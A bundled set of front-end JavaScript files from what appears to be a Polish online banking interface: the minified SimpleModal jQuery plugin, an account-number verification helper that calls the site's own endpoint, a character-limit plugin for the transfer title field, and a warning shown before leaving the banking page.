(function(d){var k=d.browser.msie&&parseInt(d.browser.version)===6&&typeof window.XMLHttpRequest!=="object",m=d.browser.msie&&parseInt(d.browser.version)===7,l=null,f=[];d.modal=function(a,b){return d.modal.impl.init(a,b)};d.modal.close=function(){d.modal.impl.close()};d.modal.focus=function(a){d.modal.impl.focus(a)};d.modal.setContainerDimensions=function(){d.modal.impl.setContainerDimensions()};d.modal.setPosition=function(){d.modal.impl.setPosition()};d.modal.update=function(a,b){d.modal.impl.update(a,
b)};d.fn.modal=function(a){return d.modal.impl.init(this,a)};d.modal.defaults={appendTo:"body",focus:true,opacity:50,overlayId:"simplemodal-overlay",overlayCss:{},containerId:"simplemodal-container",containerCss:{},dataId:"simplemodal-data",dataCss:{},minHeight:null,minWidth:null,maxHeight:null,maxWidth:null,autoResize:false,autoPosition:true,zIndex:1E3,close:true,closeHTML:'<a class="modalCloseImg" title="Close"></a>',closeClass:"simplemodal-close",escClose:true,overlayClose:false,position:null,
persist:false,modal:true,onOpen:null,onShow:null,onClose:null};d.modal.impl={d:{},init:function(a,b){var c=this;if(c.d.data)return false;l=d.browser.msie&&!d.boxModel;c.o=d.extend({},d.modal.defaults,b);c.zIndex=c.o.zIndex;c.occb=false;if(typeof a==="object"){a=a instanceof jQuery?a:d(a);c.d.placeholder=false;if(a.parent().parent().size()>0){a.before(d("<span></span>").attr("id","simplemodal-placeholder").css({display:"none"}));c.d.placeholder=true;c.display=a.css("display");if(!c.o.persist)c.d.orig=
a.clone(true)}}else if(typeof a==="string"||typeof a==="number")a=d("<div></div>").html(a);else{alert("SimpleModal Error: Unsupported data type: "+typeof a);return c}c.create(a);c.open();d.isFunction(c.o.onShow)&&c.o.onShow.apply(c,[c.d]);return c},create:function(a){var b=this;f=b.getDimensions();if(b.o.modal&&k)b.d.iframe=d('<iframe src="javascript:false;"></iframe>').css(d.extend(b.o.iframeCss,{display:"none",opacity:0,position:"fixed",height:f[0],width:f[1],zIndex:b.o.zIndex,top:0,left:0})).appendTo(b.o.appendTo);
b.d.overlay=d("<div></div>").attr("id",b.o.overlayId).addClass("simplemodal-overlay").css(d.extend(b.o.overlayCss,{display:"none",opacity:b.o.opacity/100,height:b.o.modal?f[0]:0,width:b.o.modal?f[1]:0,position:"fixed",left:0,top:0,zIndex:b.o.zIndex+1})).appendTo(b.o.appendTo);b.d.container=d("<div></div>").attr("id",b.o.containerId).addClass("simplemodal-container").css(d.extend(b.o.containerCss,{display:"none",position:"fixed",zIndex:b.o.zIndex+2})).append(b.o.close&&b.o.closeHTML?d(b.o.closeHTML).addClass(b.o.closeClass):
"").appendTo(b.o.appendTo);b.d.wrap=d("<div></div>").attr("tabIndex",-1).addClass("simplemodal-wrap").css({height:"100%",outline:0,width:"100%"}).appendTo(b.d.container);b.d.data=a.attr("id",a.attr("id")||b.o.dataId).addClass("simplemodal-data").css(d.extend(b.o.dataCss,{display:"none"})).appendTo("body");b.setContainerDimensions();b.d.data.appendTo(b.d.wrap);if(k||l)b.fixIE()},bindEvents:function(){var a=this;d("."+a.o.closeClass).bind("click.simplemodal",function(b){b.preventDefault();a.close()});
a.o.modal&&a.o.close&&a.o.overlayClose&&a.d.overlay.bind("click.simplemodal",function(b){b.preventDefault();a.close()});d(document).bind("keydown.simplemodal",function(b){if(a.o.modal&&b.keyCode===9)a.watchTab(b);else if(a.o.close&&a.o.escClose&&b.keyCode===27){b.preventDefault();a.close()}});d(window).bind("resize.simplemodal",function(){f=a.getDimensions();a.o.autoResize?a.setContainerDimensions():a.o.autoPosition&&a.setPosition();if(k||l)a.fixIE();else if(a.o.modal){a.d.iframe&&a.d.iframe.css({height:f[0],
width:f[1]});a.d.overlay.css({height:f[0],width:f[1]})}})},unbindEvents:function(){d("."+this.o.closeClass).unbind("click.simplemodal");d(document).unbind("keydown.simplemodal");d(window).unbind("resize.simplemodal");this.d.overlay.unbind("click.simplemodal")},fixIE:function(){var a=this,b=a.o.position;d.each([a.d.iframe||null,!a.o.modal?null:a.d.overlay,a.d.container],function(c,h){if(h){var g=h[0].style;g.position="absolute";if(c<2){g.removeExpression("height");g.removeExpression("width");g.setExpression("height",
'document.body.scrollHeight > document.body.clientHeight ? document.body.scrollHeight : document.body.clientHeight + "px"');g.setExpression("width",'document.body.scrollWidth > document.body.clientWidth ? document.body.scrollWidth : document.body.clientWidth + "px"')}else{var e;if(b&&b.constructor===Array){c=b[0]?typeof b[0]==="number"?b[0].toString():b[0].replace(/px/,""):h.css("top").replace(/px/,"");c=c.indexOf("%")===-1?c+' + (t = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + "px"':
parseInt(c.replace(/%/,""))+' * ((document.documentElement.clientHeight || document.body.clientHeight) / 100) + (t = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + "px"';if(b[1]){e=typeof b[1]==="number"?b[1].toString():b[1].replace(/px/,"");e=e.indexOf("%")===-1?e+' + (t = document.documentElement.scrollLeft ? document.documentElement.scrollLeft : document.body.scrollLeft) + "px"':parseInt(e.replace(/%/,""))+' * ((document.documentElement.clientWidth || document.body.clientWidth) / 100) + (t = document.documentElement.scrollLeft ? document.documentElement.scrollLeft : document.body.scrollLeft) + "px"'}}else{c=
'(document.documentElement.clientHeight || document.body.clientHeight) / 2 - (this.offsetHeight / 2) + (t = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + "px"';e='(document.documentElement.clientWidth || document.body.clientWidth) / 2 - (this.offsetWidth / 2) + (t = document.documentElement.scrollLeft ? document.documentElement.scrollLeft : document.body.scrollLeft) + "px"'}g.removeExpression("top");g.removeExpression("left");g.setExpression("top",
c);g.setExpression("left",e)}}})},focus:function(a){var b=this;a=a&&d.inArray(a,["first","last"])!==-1?a:"first";var c=d(":input:enabled:visible:"+a,b.d.wrap);setTimeout(function(){c.length>0?c.focus():b.d.wrap.focus()},10)},getDimensions:function(){var a=d(window);return[d.browser.opera&&d.browser.version>"9.5"&&d.fn.jquery<"1.3"||d.browser.opera&&d.browser.version<"9.5"&&d.fn.jquery>"1.2.6"?a[0].innerHeight:a.height(),a.width()]},getVal:function(a,b){return a?typeof a==="number"?a:a==="auto"?0:
a.indexOf("%")>0?parseInt(a.replace(/%/,""))/100*(b==="h"?f[0]:f[1]):parseInt(a.replace(/px/,"")):null},update:function(a,b){var c=this;if(!c.d.data)return false;c.d.origHeight=c.getVal(a,"h");c.d.origWidth=c.getVal(b,"w");c.d.data.hide();a&&c.d.container.css("height",a);b&&c.d.container.css("width",b);c.setContainerDimensions();c.d.data.show();c.o.focus&&c.focus();c.unbindEvents();c.bindEvents()},setContainerDimensions:function(){var a=this,b=k||m,c=a.d.origHeight?a.d.origHeight:d.browser.opera?
a.d.container.height():a.getVal(b?a.d.container[0].currentStyle.height:a.d.container.css("height"),"h");b=a.d.origWidth?a.d.origWidth:d.browser.opera?a.d.container.width():a.getVal(b?a.d.container[0].currentStyle.width:a.d.container.css("width"),"w");var h=a.d.data.outerHeight(true),g=a.d.data.outerWidth(true);a.d.origHeight=a.d.origHeight||c;a.d.origWidth=a.d.origWidth||b;var e=a.o.maxHeight?a.getVal(a.o.maxHeight,"h"):null,i=a.o.maxWidth?a.getVal(a.o.maxWidth,"w"):null;e=e&&e<f[0]?e:f[0];i=i&&i<
f[1]?i:f[1];var j=a.o.minHeight?a.getVal(a.o.minHeight,"h"):"auto";c=c?a.o.autoResize&&c>e?e:c<j?j:c:h?h>e?e:a.o.minHeight&&j!=="auto"&&h<j?j:h:j;e=a.o.minWidth?a.getVal(a.o.minWidth,"w"):"auto";b=b?a.o.autoResize&&b>i?i:b<e?e:b:g?g>i?i:a.o.minWidth&&e!=="auto"&&g<e?e:g:e;a.d.container.css({height:c,width:b});a.d.wrap.css({overflow:h>c||g>b?"auto":"visible"});a.o.autoPosition&&a.setPosition()},setPosition:function(){var a=this,b,c;b=f[0]/2-a.d.container.outerHeight(true)/2;c=f[1]/2-a.d.container.outerWidth(true)/
2;if(a.o.position&&Object.prototype.toString.call(a.o.position)==="[object Array]"){b=a.o.position[0]||b;c=a.o.position[1]||c}else{b=b;c=c}a.d.container.css({left:c,top:b})},watchTab:function(a){var b=this;if(d(a.target).parents(".simplemodal-container").length>0){b.inputs=d(":input:enabled:visible:first, :input:enabled:visible:last",b.d.data[0]);if(!a.shiftKey&&a.target===b.inputs[b.inputs.length-1]||a.shiftKey&&a.target===b.inputs[0]||b.inputs.length===0){a.preventDefault();b.focus(a.shiftKey?"last":
"first")}}else{a.preventDefault();b.focus()}},open:function(){var a=this;a.d.iframe&&a.d.iframe.show();if(d.isFunction(a.o.onOpen))a.o.onOpen.apply(a,[a.d]);else{a.d.overlay.show();a.d.container.show();a.d.data.show()}a.o.focus&&a.focus();a.bindEvents()},close:function(){var a=this;if(!a.d.data)return false;a.unbindEvents();if(d.isFunction(a.o.onClose)&&!a.occb){a.occb=true;a.o.onClose.apply(a,[a.d])}else{if(a.d.placeholder){var b=d("#simplemodal-placeholder");if(a.o.persist)b.replaceWith(a.d.data.removeClass("simplemodal-data").css("display",
a.display));else{a.d.data.hide().remove();b.replaceWith(a.d.orig)}}else a.d.data.hide().remove();a.d.container.hide().remove();a.d.overlay.hide();a.d.iframe&&a.d.iframe.hide().remove();setTimeout(function(){a.d.overlay.remove();a.d={}},10)}}}})(jQuery);

/* /ikd_scripts/skins/ipko/jquery.simplemodal.1.4.1.min.js end */
/* /ikd_scripts/skins/ipko/ajax_verify_account.js?v=5 start */
// JavaScript Document
var pasted_account_warn = false;

function applyVerifyResult(elem, name, value, desc, error, by_phone) {

    // czyscimy komunikat bledu standardowej walidacji 
    var e = jQuery(jQuery(elem).parents('table')[0]);
    e.find('table.table_transparent')
     .html('');

    elem.className = error
                     ? 'errFormField'
                     : 'formField';
    desc = desc || '';
    html = error
           ? "<span class=\"errorInfo\">" + desc + "</span>"
           : desc;
    // ustawiamy nowa wartosc pola
    if (value !== undefined) {
        elem.value = value;
    }
    // ustawiamy komunikat walidacji dynamicznej
    jQuery('#' + name + '_bank').html(html);
    if (by_phone) {
        $('#pay_title').unbind('keydown');
        $('#pay_title').unbind('keyup');
        $('#pay_title').textLimit('span.counterTruncate', 70, 0, 1);
        $('input[name=auto_save_ben]').attr('disabled', true);
        $('input[name=auto_save_ben]').attr('checked', false);
        $('#tr_ben_nick').css('display', 'none');
    } else {
        $('#pay_title').unbind('keydown');
        $('#pay_title').unbind('keyup');
        $('#pay_title').textLimit('span.counterTruncate', 140, 0, 1);
        $('input[name=auto_save_ben]').attr('disabled', false);
    }
}


function clearVerifyResult(elem, name) {
    applyVerifyResult(elem, name);
}


function getIbanHelper(acc_type) {
    if (acc_type === 'generic' || acc_type === 'by_phone') {
        return {
            'inputData': function(value) {
                if (acc_type === 'by_phone') {
                    return '{"sid": "' + softaxData.ses_id + '", "account": "' + value + '", "verify_phone": "1"}';
                } else {
                    return '{"sid": "' + softaxData.ses_id + '", "account": "' + value + '"}';
                }
            },
            'description': function(data) {
                return data.bank_name !== undefined 
                       ? data.bank_name
                       : '';
            }
        }
    }
    if (acc_type === 'us') {
        return {
            'inputData': function(value) {
                return '{"sid": "' + softaxData.ses_id + '", "account": "' + value + '", "verify_us": "1"}';
            },
            'description': function(data) {
                return data.bank_name !== undefined &&
                       data.us_name !== undefined
                       ? data.bank_name + '<br>' + data.us_name.join('<br>') + '<br><br>'
                       : '';
            }
        }
    }
}


function verifyIbanAjax(elem, name, options) {

    if (pasted_account_warn) return false;
    var acc_type = (options && options.account_type) || 'generic';
    var helper = getIbanHelper(acc_type);
    
    if (options &&
        options.verify_if_not_empty &&
        !elem.value.length) {
        clearVerifyResult(elem, name);
    } else {
        jQuery.ajax({
            url: softaxData.ajax_url + '/account_verify',
            type: 'POST',
            data: helper.inputData(elem.value),
            processData: false,
            dataType: 'json',
            success: function(data) {
                var descr = data.error
                            ? data.descr
                            : helper.description(data);
                applyVerifyResult(elem, name, data.number, descr, data.error, data.phone);
            },
            error: function() {
                // nie udalo sie; usuwamy ewentualny wczesiejszy wynik poniewaz
                // wartosc pola mogla zostac zmieniona przez uzytkownika od czasu ostatniej walidacji 
                clearVerifyResult(elem, name);
            }
        });
    }
}

/* /ikd_scripts/skins/ipko/ajax_verify_account.js?v=5 end */
/* /ikd_scripts/skins/ipko/textLimit.js?v=1 start */
/*
 * TextLimit - jQuery plugin for counting and limiting characters for input and textarea fields
 * 
 * pass '-1' as speed if you don't want the char-deletion effect. (don't just put 0)
 * Example: jQuery("Textarea").textlimit('span.counter',256)
 *
 * $Version: 2009.07.25 +r2
 * Copyright (c) 2009 Yair Even-Or
 * vsync.design@gmail.com
 * counter_el - identyfikator pola do zliczania znaków
 * thelimit - maksymalna ilo¶æ znaków mo¿liwa do wpisania
 * speed - szybko¶æ z jak± bêd± usuwane znaki
 * info - pokzaywanie informacji o ilo¶æi dostêpnych/usuwanych znakow
*/
(function(jQuery) {
    jQuery.fn.textLimit=function(counter_el, thelimit, speed, info) {
        var charDelSpeed = speed || 15;
        var toggleCharDel = speed != -1;
        var toggleTrim = true;
        var that = this[0];
        var isCtrl = false;
        var isBksp = false;
        var lineRgExp = /[\r\n|\r|\n]/g;
        var fullRgExp = /[^\r\n|\r|\n]{35}[\r\n|\r|\n]/g;
        var cntCor = 0;

        updateCounter();

        function updateCounter(){
            if(typeof that == "object" && info) {
                cntCor = (that.value.match(fullRgExp) != null) ? that.value.match(fullRgExp).length : 0;
                cntCor = (isBksp && cntCor > 0 && cntCor < 3) ? Math.max(cntCor + 1, 3) : cntCor;
                var tmpCnt = thelimit - that.value.length + cntCor;
                jQuery(counter_el).text("Pozosta³o znaków: "+tmpCnt);
            }
        };

        this.keydown (function(e){
            if(e.which == 17) isCtrl = true;
            if(e.which == 8 || e.which == 46) isBksp = true;
            cntCor = (!isBksp && cntCor > 0 && cntCor < 3) ? Math.min(cntCor - 1, 0) : cntCor;
            var ctrl_a = (e.which == 65 && isCtrl == true) ? true : false; // detect and allow CTRL + A selects all.
            var ctrl_v = (e.which == 86 && isCtrl == true) ? true : false; // detect and allow CTRL + V paste.
            // 8 is 'backspace' and 46 is 'delete'

            if( this.value.length - cntCor >= thelimit && e.which != '8' && e.which != '46' && ctrl_a == false && ctrl_v == false)  {
                // 37 - 40 - strza³ki , 35, 36 home, end 
                if (e.which == '37' || e.which == '38' || e.which == '39' || e.which == '40' || e.which == '36' || e.which == '35') {}
                else
                    e.preventDefault(); 
            }
        });

        var keyUpHandler = function(e) {
            if (e.which == '37' || e.which == '38' || e.which == '39' || e.which == '40' || e.which == '36' || e.which == '35') {}
            else
                updateCounter();

            if(e.which == 17)
                isCtrl = false;
            if(e.which == 8)
                isBksp = false;

            if( this.value.length - cntCor >= thelimit && toggleTrim ){
                
                if(toggleCharDel){
                    // first, trim the text a bit so the char trimming wont take forever
                    // Also check if there are more than 10 extra chars, then trim. just in case.
                    if ( (this.value.length - thelimit) > 10 )
                        that.value = that.value.substr(0,thelimit+100);
                    var init = setInterval
                        ( 
                            function(){
                                if( that.value.length - cntCor <= thelimit || (that.value.match(lineRgExp) != null && that.value.match(lineRgExp).length > 3) ){
                                    init = clearInterval(init); updateCounter();
                                }
                                else{
                                    // deleting extra chars (one by one)
                                    that.value = that.value.substring(0,that.value.length-1); 
                                    if (info) {
                                        jQuery(counter_el).text('Usuwanie nadmiaru znaków... '+(thelimit - that.value.length));
                                    }
                                }
                            } ,charDelSpeed 
                        );
                }
                else {
                    this.value = that.value.substr(0,thelimit);
                }
            }
        };

        this.keyup (keyUpHandler);
        this.bind('paste', 
            function(e) {
                if(jQuery.browser.msie) {
                    var __timeoutPast = setInterval(
                        function() {
                            clearInterval(__timeoutPast);
                            jQuery(that).trigger('keyup', e);
                        }, 1
                    );
                }
                else {
                    self = e.target;
                    setTimeout(function(){jQuery(self).trigger('keyup', e);}, 1);
                }
            }
        );
    };
})(jQuery);
/* /ikd_scripts/skins/ipko/textLimit.js?v=1 end */
/* _anonymous_3_9c71b6b069 start */
<!--
        jQuery('form').live('submit', function() {
            dont_show_back_reload_window = 1;
        });
        var before_unload_text = 'Wybór opcji "wstecz", "od¶wie¿", zamkniêcie karty przegl±darki lub przegl±darki, spowoduje opuszczenie serwisu bankowo¶ci elektronicznej. W celu ponownego skorzystania z us³ug konieczne bêdzie ponowne zalogowanie. Pamiêtaj, ¿e przyciski "wstecz" i "od¶wie¿" oraz zamykanie strony krzy¿ykiem, nie s³u¿± do przechodzenia miêdzy zak³adkami serwisu ani bezpiecznego wylogowania.';
        window.onbeforeunload = function(){
            if (!dont_show_back_reload_window && before_unload_text) {
                return before_unload_text
            }
        }
     //-->
/* _anonymous_3_9c71b6b069 end */
